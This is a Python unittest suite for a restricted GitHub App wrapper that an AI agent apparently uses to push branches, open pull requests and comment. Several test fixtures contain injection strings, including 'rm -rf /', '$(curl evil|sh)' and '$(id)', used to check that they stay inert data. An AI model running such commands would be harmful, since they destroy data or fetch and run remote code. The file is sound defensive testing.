#!/usr/bin/env python3
"""Offline tests for the constrained VirtuaJimmy GitHub App wrapper."""

import argparse
import base64
import contextlib
import importlib.util
import io
import json
import os
import pathlib
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

HERE = pathlib.Path(__file__).resolve().parent
MODULE_PATH = HERE.parent / "files" / "virtuajimmy-github-app" / "github_app.py"


def load_wrapper():
    spec = importlib.util.spec_from_file_location("github_app", MODULE_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class WrapperTests(unittest.TestCase):
    def setUp(self):
        self.wrapper = load_wrapper()
        self.tempdir = tempfile.TemporaryDirectory()
        self.addCleanup(self.tempdir.cleanup)
        self.key = pathlib.Path(self.tempdir.name) / "app.pem"
        self.key.write_text("test-only-key", encoding="utf-8")
        self.key.chmod(0o600)
        self.config = {
            "api_url": "https://api.github.com",
            "app_id": "123",
            "installation_id": "456",
            "private_key_file": str(self.key),
            "allowed_repositories": ["jimmybish/homelab"],
        }

    def test_jwt_claims_and_algorithm_are_bounded(self):
        completed = mock.Mock(returncode=0, stdout=b"signature", stderr=b"")
        with mock.patch.object(self.wrapper.subprocess, "run", return_value=completed):
            token = self.wrapper.mint_jwt(self.config, now=1_000)
        header, payload, _signature = token.split(".")
        decode = lambda part: json.loads(base64.urlsafe_b64decode(part + "==="))
        self.assertEqual(decode(header), {"alg": "RS256", "typ": "JWT"})
        self.assertEqual(
            decode(payload), {"iat": 940, "exp": 1540, "iss": "123"}
        )
        self.assertNotIn("test-only-key", token)

    def test_token_is_restricted_to_repo_and_fixed_permissions(self):
        requests = []

        def fake_request(config, method, path, bearer, payload=None):
            requests.append((method, path, bearer, payload))
            return {"token": "installation-secret"}

        with mock.patch.object(self.wrapper, "mint_jwt", return_value="signed-jwt"):
            with mock.patch.object(self.wrapper, "api_request", side_effect=fake_request):
                token = self.wrapper.installation_token(
                    self.config, "jimmybish/homelab"
                )
        self.assertEqual(token, "installation-secret")
        self.assertEqual(
            requests[0][3],
            {
                "repositories": ["homelab"],
                "permissions": {
                    "contents": "write",
                    "pull_requests": "write",
                    "issues": "write",
                },
            },
        )

    def test_push_uses_fixed_remote_and_does_not_expose_token(self):
        completed = mock.Mock(returncode=0, stdout="ok", stderr="")
        captured_config = []

        def fake_run(*_args, **kwargs):
            command = _args[0]
            if command[:3] == ["git", "rev-parse", "--show-toplevel"]:
                return mock.Mock(
                    returncode=0, stdout="/srv/homelab\n", stderr=""
                )
            if command[:3] == ["git", "config", "--file"]:
                pathlib.Path(command[3]).write_text(
                    "[safe]\n\tdirectory = /srv/homelab\n",
                    encoding="utf-8",
                )
                return completed
            captured_config.append(pathlib.Path(
                kwargs["env"]["GIT_CONFIG_GLOBAL"]
            ).read_text(encoding="utf-8"))
            return completed

        args = argparse.Namespace(
            repo="jimmybish/homelab", branch="task/7", source="HEAD"
        )
        with mock.patch.object(
            self.wrapper, "installation_token", return_value="installation-secret"
        ), mock.patch.object(
            self.wrapper.subprocess, "run", side_effect=fake_run
        ) as run:
            result = self.wrapper.push_branch(self.config, args)
        command = run.call_args_list[-1].args[0]
        environment = run.call_args_list[-1].kwargs["env"]
        self.assertEqual(command[2], "--porcelain")
        self.assertEqual(command[3], "https://github.com/jimmybish/homelab.git")
        self.assertEqual(command[4], "HEAD:refs/heads/task/7")
        self.assertNotIn("installation-secret", " ".join(command))
        self.assertNotIn("installation-secret", json.dumps(environment))
        self.assertIn("directory = /srv/homelab", captured_config[0])
        self.assertIn("Authorization: Basic", captured_config[0])
        self.assertNotIn("installation-secret", captured_config[0])
        self.assertNotIn("installation-secret", json.dumps(result))

    def test_open_pr_uses_approved_endpoint_and_fields(self):
        requests = []

        def fake_request(config, method, path, bearer, payload=None):
            requests.append((method, path, bearer, payload))
            return {"number": 9, "html_url": "https://github.com/example/pull/9"}

        args = argparse.Namespace(
            repo="jimmybish/homelab",
            head="task/9",
            base="main",
            title_file=self.write_text("title.txt", "Task 9"),
            body_file=self.write_text("body.md", "Summary"),
            draft=False,
        )
        with mock.patch.object(
            self.wrapper, "installation_token", return_value="installation-secret"
        ), mock.patch.object(
            self.wrapper, "api_request", side_effect=fake_request
        ):
            result = self.wrapper.open_pr(self.config, args)
        self.assertEqual(requests[0][0:2], (
            "POST", "/repos/jimmybish/homelab/pulls"
        ))
        self.assertEqual(
            requests[0][3],
            {
                "title": "Task 9",
                "head": "task/9",
                "base": "main",
                "body": "Summary",
                "draft": False,
            },
        )
        self.assertEqual(result["number"], 9)

    def test_disallowed_repo_is_rejected_before_token_mint(self):
        with mock.patch.object(self.wrapper, "installation_token") as mint:
            stderr = io.StringIO()
            with contextlib.redirect_stderr(stderr):
                result = self.wrapper.main([
                    "--config", self.write_config(),
                    "open-pr", "--repo", "someone/else", "--head", "task",
                    "--title-file", self.write_text("title.txt", "title"),
                    "--body-file", self.write_text("body.txt", "body"),
                ])
        self.assertEqual(result, 1)
        mint.assert_not_called()
        self.assertIn("not allowed", stderr.getvalue())

    def test_comment_requires_pull_request_and_never_outputs_token(self):
        responses = iter([
            {"token": "installation-secret"},
            {"number": 7},
        ])
        with mock.patch.object(self.wrapper, "mint_jwt", return_value="jwt"):
            with mock.patch.object(
                self.wrapper, "api_request", side_effect=lambda *a, **k: next(responses)
            ):
                stdout, stderr = io.StringIO(), io.StringIO()
                with contextlib.redirect_stdout(stdout), contextlib.redirect_stderr(stderr):
                    result = self.wrapper.main([
                        "--config", self.write_config(),
                        "comment", "--repo", "jimmybish/homelab",
                        "--pr", "7",
                        "--body-file", self.write_text("comment.txt", "hello"),
                    ])
        self.assertEqual(result, 1)
        self.assertIn("not a pull request", stderr.getvalue())
        self.assertNotIn("installation-secret", stdout.getvalue() + stderr.getvalue())

    def test_comment_adds_loop_marker(self):
        requests = []

        def fake_request(config, method, path, bearer, payload=None):
            requests.append((method, path, payload))
            if method == "GET":
                return {"pull_request": {"url": "example"}}
            return {"html_url": "https://github.com/jimmybish/homelab/pull/7"}

        args = argparse.Namespace(
            repo="jimmybish/homelab", pr=7,
            body_file=self.write_text("comment.txt", "done"),
        )
        with mock.patch.object(
            self.wrapper, "installation_token", return_value="secret"
        ), mock.patch.object(
            self.wrapper, "api_request", side_effect=fake_request
        ):
            self.wrapper.comment(self.config, args)
        self.assertTrue(requests[-1][2]["body"].endswith(
            self.wrapper.COMMENT_MARKER
        ))

    def test_private_key_mode_must_be_strict(self):
        self.key.chmod(0o640)
        with self.assertRaisesRegex(self.wrapper.AppError, "group or others"):
            self.wrapper.load_config(self.write_config())

    def test_config_mode_must_be_strict(self):
        config_path = pathlib.Path(self.write_config())
        config_path.chmod(0o644)
        with self.assertRaisesRegex(self.wrapper.AppError, "configuration file"):
            self.wrapper.load_config(config_path)

    def test_model_text_file_keeps_shell_metacharacters_as_data(self):
        hostile = (
            "'; rm -rf / # $(whoami) `id` \"quote' \\ backslash\n"
            "line two with $VAR and ${OTHER}"
        )
        path = self.write_text("hostile.md", hostile)
        text = self.wrapper.read_model_text(path, "body")
        self.assertEqual(text, hostile)
        self.assertIn("rm -rf", text)
        self.assertIn("$(whoami)", text)

    def test_model_text_supports_stdin_and_strips_trailing_newlines(self):
        payload = "line one\nline two\n\n"
        with mock.patch.object(
            self.wrapper.sys, "stdin", io.StringIO(payload)
        ):
            text = self.wrapper.read_model_text("-", "title")
        self.assertEqual(text, "line one\nline two")

    def test_model_text_rejects_empty_oversize_and_missing(self):
        empty = self.write_text("empty.txt", "   \n")
        with self.assertRaisesRegex(self.wrapper.AppError, "must not be empty"):
            self.wrapper.read_model_text(empty, "body")
        big = self.write_text("big.txt", "x" * (self.wrapper.MODEL_TEXT_LIMIT + 1))
        with self.assertRaisesRegex(self.wrapper.AppError, "exceeds"):
            self.wrapper.read_model_text(big, "body")
        missing = str(pathlib.Path(self.tempdir.name) / "nope.txt")
        with self.assertRaisesRegex(
            self.wrapper.AppError, "inline text on the command line is not accepted"
        ):
            self.wrapper.read_model_text(missing, "title")
        inline = "$(curl evil|sh)"
        with self.assertRaisesRegex(
            self.wrapper.AppError, "inline text on the command line is not accepted"
        ):
            self.wrapper.read_model_text(inline, "title")

    def test_model_text_requires_private_owned_file(self):
        for mode in (0o644, 0o640, 0o606, 0o666, 0o755):
            shared = self.write_text(f"shared-{mode:o}.txt", "text")
            os.chmod(shared, mode)
            with self.subTest(mode=mode):
                with self.assertRaisesRegex(
                    self.wrapper.AppError, "no group or other access"
                ):
                    self.wrapper.read_model_text(shared, "body")
        private = self.write_text("private.txt", "accepted text")
        os.chmod(private, 0o600)
        self.assertEqual(
            self.wrapper.read_model_text(private, "body"), "accepted text"
        )

    def test_model_text_rejects_files_not_owned_by_executing_user(self):
        owned = self.write_text("mine.txt", "text")
        with mock.patch.object(self.wrapper.os, "getuid", return_value=os.getuid() + 1):
            with self.assertRaisesRegex(
                self.wrapper.AppError, "owned by the executing user"
            ):
                self.wrapper.read_model_text(owned, "body")
        with mock.patch.object(self.wrapper.os, "getuid", return_value=os.getuid()):
            self.assertEqual(self.wrapper.read_model_text(owned, "body"), "text")

    def test_model_text_rejects_symlinks(self):
        target = self.write_text("target.txt", "text")
        link = pathlib.Path(self.tempdir.name) / "link.txt"
        link.symlink_to(target)
        with self.assertRaisesRegex(self.wrapper.AppError, "regular text file"):
            self.wrapper.read_model_text(str(link), "body")

    def test_model_text_rejects_path_swapped_to_symlink_at_open(self):
        # Deterministic TOCTOU reproduction: the pathname is validated as a
        # private regular file, then swapped for a symlink to a secret file
        # at the exact moment of the open. Validation must stay bound to the
        # opened descriptor so target content is never returned.
        secret = self.write_text("secret.txt", "TARGET_CONTENT")
        candidate = self.write_text("candidate.txt", "safe text")
        real_open = os.open

        def swapping_open(path, flags, *args, **kwargs):
            if pathlib.Path(path).name == "candidate.txt":
                os.unlink(candidate)
                os.symlink(secret, candidate)
            return real_open(path, flags, *args, **kwargs)

        with mock.patch.object(self.wrapper.os, "open", side_effect=swapping_open):
            with self.assertRaises(self.wrapper.AppError) as caught:
                self.wrapper.read_model_text(str(candidate), "body")
        self.assertNotIn("TARGET_CONTENT", str(caught.exception))
        self.assertTrue(pathlib.Path(candidate).is_symlink())

    def test_model_text_rejects_special_files(self):
        directory = pathlib.Path(self.tempdir.name) / "adir"
        directory.mkdir()
        with self.assertRaisesRegex(self.wrapper.AppError, "regular text file"):
            self.wrapper.read_model_text(str(directory), "body")

    def test_model_text_rejects_fifo_without_blocking(self):
        # A writer-less FIFO opened without O_NONBLOCK hangs forever in
        # os.open() before fstat can reject it. Run under a hard timeout so
        # a regression fails fast instead of hanging the suite, and prove
        # the subprocess raises AppError (exit 0) rather than timing out.
        fifo = pathlib.Path(self.tempdir.name) / "private.fifo"
        os.mkfifo(fifo)
        os.chmod(fifo, 0o600)
        script = (
            "import importlib.util, sys\n"
            "spec = importlib.util.spec_from_file_location('github_app', sys.argv[1])\n"
            "mod = importlib.util.module_from_spec(spec)\n"
            "spec.loader.exec_module(mod)\n"
            "try:\n"
            "    mod.read_model_text(sys.argv[2], 'body')\n"
            "except mod.AppError:\n"
            "    sys.exit(0)\n"
            "except Exception:\n"
            "    sys.exit(2)\n"
            "sys.exit(3)\n"
        )
        try:
            completed = subprocess.run(
                [sys.executable, "-c", script, str(MODULE_PATH), str(fifo)],
                capture_output=True,
                timeout=10,
            )
        except subprocess.TimeoutExpired:
            self.fail("read_model_text blocked on a writer-less FIFO")
        self.assertEqual(completed.returncode, 0, completed.stderr.decode())

    def test_model_text_rejects_fifo_with_writer_via_fstat(self):
        # With a writer attached the non-blocking open succeeds, so the
        # rejection must come from the fstat regular-file check bound to
        # the opened descriptor.
        fifo = pathlib.Path(self.tempdir.name) / "held.fifo"
        os.mkfifo(fifo)
        os.chmod(fifo, 0o600)
        writer = os.open(fifo, os.O_RDWR)
        try:
            with self.assertRaisesRegex(
                self.wrapper.AppError, "regular text file"
            ):
                self.wrapper.read_model_text(str(fifo), "body")
        finally:
            os.close(writer)

    def test_model_text_reads_stdin_bounded_by_the_limit(self):
        class RecordingStdin(io.StringIO):
            requested = None

            def read(self, size=-1):
                RecordingStdin.requested = size
                return super().read(size)

        with mock.patch.object(
            self.wrapper.sys, "stdin", RecordingStdin("accepted text")
        ):
            text = self.wrapper.read_model_text("-", "title")
        self.assertEqual(text, "accepted text")
        self.assertEqual(
            RecordingStdin.requested, self.wrapper.MODEL_TEXT_LIMIT + 1
        )

    def test_model_text_rejects_oversized_stdin(self):
        payload = "x" * (self.wrapper.MODEL_TEXT_LIMIT + 1)
        with mock.patch.object(self.wrapper.sys, "stdin", io.StringIO(payload)):
            with self.assertRaisesRegex(
                self.wrapper.AppError, f"exceeds {self.wrapper.MODEL_TEXT_LIMIT}"
            ):
                self.wrapper.read_model_text("-", "body")

    def test_open_pr_and_comment_reject_inline_text_and_hide_it_from_argv(self):
        hostile = "PR $(id) `whoami` body with \"quotes\" and 'apostrophes'"
        for argv in (
            ["--config", self.write_config(), "open-pr", "--repo",
             "jimmybish/homelab", "--head", "task/9",
             "--title", hostile, "--body", hostile],
            ["--config", self.write_config(), "comment", "--repo",
             "jimmybish/homelab", "--pr", "7", "--body", hostile],
        ):
            stderr = io.StringIO()
            with contextlib.redirect_stderr(stderr):
                with self.assertRaises(SystemExit):  # argparse: unknown option
                    self.wrapper.main(argv)
            self.assertIn("title-file" if "open-pr" in argv else "body-file",
                          stderr.getvalue())
            self.assertNotIn(hostile, stderr.getvalue())

    def test_usage_errors_never_echo_user_supplied_text(self):
        # Hostile inline --title/--body alongside OTHERWISE-VALID file args:
        # argparse reaches the unrecognized-arguments stage and used to echo
        # the rejected values verbatim in its error tail.
        hostile = "SECRET-DRAFT-$(id)-`whoami`-payload"
        title_file = self.write_text("t.txt", "Safe title")
        body_file = self.write_text("b.txt", "Safe body")
        cases = [
            ["--config", self.write_config(), "open-pr", "--repo",
             "jimmybish/homelab", "--head", "wt/t_1",
             "--title-file", title_file, "--body-file", body_file,
             "--title", hostile, "--body", hostile],
            ["--config", self.write_config(), "comment", "--repo",
             "jimmybish/homelab", "--pr", "7",
             "--body-file", body_file, "--body", hostile],
        ]
        for argv in cases:
            stdout, stderr = io.StringIO(), io.StringIO()
            with contextlib.redirect_stdout(stdout), \
                    contextlib.redirect_stderr(stderr):
                with self.assertRaises(SystemExit) as caught:
                    self.wrapper.main(argv)
            output = stdout.getvalue() + stderr.getvalue()
            self.assertEqual(caught.exception.code, 2)
            self.assertNotIn(hostile, output)
            self.assertIn("usage:", stderr.getvalue())
            self.assertEqual(output.count("invalid command line"), 1)

    def test_malformed_option_values_are_not_echoed(self):
        # Type-conversion failures (e.g. non-integer --pr) must also stay
        # generic instead of echoing the rejected value.
        argv = ["--config", self.write_config(), "comment", "--repo",
                "jimmybish/homelab", "--pr", "$(id)", "--body-file", "b"]
        stdout, stderr = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(stdout), \
                contextlib.redirect_stderr(stderr):
            with self.assertRaises(SystemExit) as caught:
                self.wrapper.main(argv)
        self.assertEqual(caught.exception.code, 2)
        self.assertNotIn("$(id)", stdout.getvalue() + stderr.getvalue())

    def test_parser_subcommands_all_use_sanitized_parser(self):
        root = self.wrapper.parser()
        self.assertIsInstance(root, self.wrapper.SanitizedArgumentParser)
        subparsers = [
            action for action in root._actions
            if isinstance(action, argparse._SubParsersAction)
        ]
        self.assertEqual(len(subparsers), 1)
        for name, sub in subparsers[0].choices.items():
            self.assertIsInstance(
                sub, self.wrapper.SanitizedArgumentParser, msg=name)

    def test_open_pr_text_never_reaches_child_process_argv(self):
        hostile = "Body $('`\"\\ injection') payload"
        title_file = self.write_text("title.txt", "Task title " + hostile)
        body_file = self.write_text("body.txt", hostile)
        args = argparse.Namespace(
            repo="jimmybish/homelab", head="task/9", base="main",
            title_file=title_file, body_file=body_file, draft=False,
        )
        with mock.patch.object(
            self.wrapper, "installation_token", return_value="secret"
        ), mock.patch.object(
            self.wrapper, "api_request",
            return_value={"number": 1, "html_url": "url"},
        ) as api, mock.patch.object(
            self.wrapper.subprocess, "run"
        ) as run:
            self.wrapper.open_pr(self.config, args)
        run.assert_not_called()
        payload = api.call_args.args[4]
        self.assertEqual(payload["body"], hostile)
        self.assertIn(hostile, payload["title"])

    def test_parser_requires_file_transport_for_all_model_text(self):
        text = "Model prose `with $(metachars)` and \"quotes\"\nsecond line"
        title_file = self.write_text("t.txt", "Title " + text)
        body_file = self.write_text("b.txt", text)
        args = self.wrapper.parser().parse_args([
            "--config", "cfg", "open-pr", "--repo", "jimmybish/homelab",
            "--head", "wt/t_1", "--title-file", title_file,
            "--body-file", body_file,
        ])
        self.assertEqual(args.title_file, title_file)
        self.assertEqual(args.body_file, body_file)
        self.assertFalse(any(text in value for value in
                             [args.repo, args.head, args.base,
                              args.title_file, args.body_file]))
        self.wrapper.parser().parse_args([
            "--config", "cfg", "comment", "--repo", "jimmybish/homelab",
            "--pr", "3", "--body-file", body_file,
        ])

    def write_text(self, name, content):
        path = pathlib.Path(self.tempdir.name) / name
        path.write_text(content, encoding="utf-8")
        path.chmod(0o600)
        return str(path)

    def write_config(self):
        path = pathlib.Path(self.tempdir.name) / "config.json"
        path.write_text(json.dumps(self.config), encoding="utf-8")
        path.chmod(0o600)
        return str(path)


if __name__ == "__main__":
    unittest.main()
